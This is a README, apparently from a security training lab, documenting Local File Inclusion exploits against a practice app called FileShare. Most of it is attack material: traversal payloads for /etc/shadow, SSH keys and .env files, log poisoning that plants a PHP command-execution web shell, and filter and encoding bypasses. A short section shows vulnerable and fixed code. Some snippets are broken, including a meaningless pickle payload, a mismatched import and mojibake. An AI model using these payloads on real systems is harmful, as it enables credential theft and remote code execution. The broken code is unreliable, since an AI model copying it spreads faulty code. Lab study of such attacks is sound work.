# FileShare LFI Exploits

## Overview
This directory contains Local File Inclusion exploits for the FileShare application. The download and view endpoints allow reading arbitrary files from the server.

## Target Application
- **App**: FileShare
- **Port**: 5003
- **Vulnerability**: Local File Inclusion (LFI)
- **Severity**: CRITICAL

## Available Exploits

### 1. path_traversal.py
**Type**: Directory traversal attack  
**Target**: `/download?file=<path>`

**Usage**:
```bash
# Read /etc/passwd
python path_traversal.py http://localhost:5003

# Custom file
python path_traversal.py http://localhost:5003 --file "/etc/shadow"

# Manual test
curl "http://localhost:5003/download?file=../../../../etc/passwd"
```

### 2. lfi_to_rce.py
**Type**: LFI escalation to RCE  
**Technique**: Log poisoning or /proc/self/environ

**Usage**:
```bash
# Attempt RCE via LFI
python lfi_to_rce.py http://localhost:5003

# Read application source
curl "http://localhost:5003/download?file=../app.py"
```

## LFI Payloads

### Basic Traversal
```
../../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Linux Interesting Files
```
/etc/passwd
/etc/shadow
/root/.bashhistory
/root/.ssh/id_rsa
/var/log/apache2/access.log
/proc/self/environ
```

### Application Files
```
../app.py
../config.py
../.env
../database.db
```

## LFI to RCE

### Method 1: Log Poisoning
```bash
# 1. Poison access log with PHP code
curl "http://localhost:5003/" -H "User-Agent: <?php system($_GET['cmd']); ?>"

# 2. Include log file and execute
curl "http://localhost:5003/download?file=../../../../var/log/apache2/access.log&cmd=id"
```

### Method 2: Session File Inclusion
```python
# 1. Create session with malicious data
import pickle
payload = pickle.dumps(os.system, 'id')
session['data'] = payload

# 2. Include session file
# /var/lib/php/sessions/sess_<session_id>
```

### Method 3: /proc Abuse
```bash
# Read environment variables
curl "http://localhost:5003/download?file=/proc/self/environ"

# Read process memory
curl "http://localhost:5003/download?file=/proc/self/mem"
```

## Testing Steps

1. **Start FileShare**:
```bash
cd ../../projects/fileshare
docker-compose up -d
```

2. **Test Basic LFI**:
```bash
python path_traversal.py http://localhost:5003
```

3. **Verify File Read**:
```bash
# Should output /etc/passwd
curl "http://localhost:5003/download?file=../../../../etc/passwd"
```

4. **Attempt RCE**:
```bash
python lfi_to_rce.py http://localhost:5003
```

## Defense Analysis

**Vulnerable Code**:
```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(filename)  # No validation!
```

**Fixed Code**:
```python
import os
from werkzeug.utils import securename

UPLOAD_DIR = '/var/uploads'

@app.route('/download')
def download():
    filename = secure_filename(request.args.get('file'))
    filepath = os.path.join(UPLOAD_DIR, filename)
    
    # Ensure path is within allowed directory
    if not os.path.abspath(filepath).startswith(UPLOAD_DIR):
        return "Access denied", 403
    
    return send_file(filepath)
```

## Advanced Techniques

### Null Byte Bypass
```bash
# If extension is appended
curl "http://localhost:5003/download?file=../../../../etc/passwd%00.txt"
```

### Encoding Bypass
```bash
# URL encoding
../../../../etc/passwd â†’ ..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd
```

### Filter Bypass
```bash
# If ../ is filtered
....//....//....//etc/passwd

# If ./ is filtered
..././..././etc/passwd
```

## Detection

**Manual Testing**:
1. Identify file parameter
2. Try basic traversal: `../../../etc/passwd`
3. Adjust depth based on response
4. Test filters and encoding

**Automated**:
```bash
# Using dotdotpwn
dotdotpwn -m http -h localhost -x 5003 -f /etc/passwd

# Using wfuzz
wfuzz -c -z file,/usr/share/wordlists/lfi.txt \
  "http://localhost:5003/download?file=FUZZ"
```

## Notes
**WARNING**: LFI can lead to:
- Source code disclosure
- Configuration file exposure
- SSH key theft
- Remote Code Execution
- Complete system compromise

**Prevention**:
- Never allow user input in file paths
- Use whitelists, not blacklists
- Implement secure_filename()
- Chroot/jail file operations
- Monitor file access logs

## Related Exploits
- See `../../securedoc/lfi/` for more LFI techniques
- See `../../dsvpwa/lfi/` for path traversal variants
- See `../rce/` for RCE escalation methods

## References
- OWASP LFI: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- LFI Cheat Sheet: https://highon.coffee/blog/lfi-cheat-sheet/
